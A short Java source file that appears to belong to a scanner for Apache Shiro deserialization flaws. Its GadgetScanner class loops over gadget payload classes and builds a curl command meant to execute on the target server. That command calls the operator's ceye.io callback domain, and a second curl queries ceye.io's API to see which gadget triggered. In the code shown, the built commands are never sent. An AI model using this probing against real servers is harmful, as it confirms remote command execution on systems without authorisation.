package core.scan;

import core.payload.ObjectPayload;
import core.util.ConfigPropertiesReader;
import core.util.Payload;
import core.util.RandomID;

import java.util.Set;

/**
 * To fuzz gadget
 */
public class GadgetScanner implements ShiroScanner{
    /**
     * ceye token
     */
    private final String token = ConfigPropertiesReader.getProp("token");

    /**
     * ceye identifier
     */
    private final String identifier = ConfigPropertiesReader.getProp("identifier");

    private String base;

    @Override
    public void setBase(String base) {
        this.base = base;
    }

    @Override
    public void scan() throws Exception {
        String queryTemplate = "curl 'http://api.ceye.io/v1/records?token={%s}&type=http&filter={%s}'";
        String commandTemplate = "curl '%s/%s'";

        Set<Class<? extends ObjectPayload>> set = Payload.getAllPayloadClass();
        for (Class<? extends ObjectPayload> aClass : set) {

            String id = RandomID.randomID();
            // 服务端执行
            String command = String.format(commandTemplate, identifier, id);
            // 客户端执行
            String queryCommand = String.format(queryTemplate, token, id);
        }

    }
}
